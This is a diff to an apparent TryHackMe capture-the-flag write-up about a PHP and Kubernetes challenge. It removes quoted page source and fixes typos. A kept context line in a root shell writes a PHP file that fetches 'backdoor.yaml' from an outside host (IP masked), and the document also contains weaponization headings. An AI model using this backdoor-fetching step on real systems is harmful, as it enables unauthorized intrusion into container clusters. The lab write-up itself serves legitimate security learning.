@@ -25,8 +25,7 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 - Weaponization<br>
 - Delivery and Execution<br>
 - Initial Foothold<br>
-- <br>
--</p>
+- ...</p>
 
 <br>
 <br>
@@ -415,26 +414,6 @@ Task Completed
 <br>
 <br>
 <br>
-<p>
-    
-- Viewed Page Source</p>
-
-```bash
-FRANK RULEZZ!
-
-FRANK's WORLD DOMINATION RESTART!
-
-There is no way they will break in this time!
-<p>This site is built with STATE-OF-THE-ART PHP!! The greatest programming language ever created!</p>
-    <p>Also powered by the most advanced and inheirantly secure app deployment technology:</p>
-    <h1>KUBERNETES!!!!!!</h1>
-    <p>Using the power of KUBECTL!!!</p>
-    <p>Pronounced: KUBE + CONTROL! NOT KUBE + CUDDLE!</p>
-    <p>
-        <marquee>Because I CONTROL the KUBE! I don't CUDDLE it!</marquee>
-```
-
-<br>
 <h1 align="center">Weaponization</h1>
 
 
@@ -621,7 +600,7 @@ chmod +x kubectl
 
 <p>
 
-- after attempts to evolve in this challenge, on many different days, I learned that I could trannsfer files in an simpler way<br><br><br>
+- after attempts to evolve in this challenge, on many different days, I learned that I could transfer files in an simpler way<br><br><br>
 - I have never needed so much faith and grit to keep going ...</p>
 
 
@@ -631,7 +610,7 @@ root@php-deploy-6d998f68b9-fvtcg:/var/www/html# cat > /var/www/html/aa.php << 'E
 > <?php
 <?php
 > file_put_contents('backdoor.yaml', file_get_contents('http://xx.xxx.xx.xx:8000/backdoor.yaml'))
-<ontents('http://x.xxx.xx.xx:8000/backdoor.yaml'))
+<ontents('http://xx.xxx.xx.xx:8000/backdoor.yaml'))
 > ?>
 ?>
 > EOF
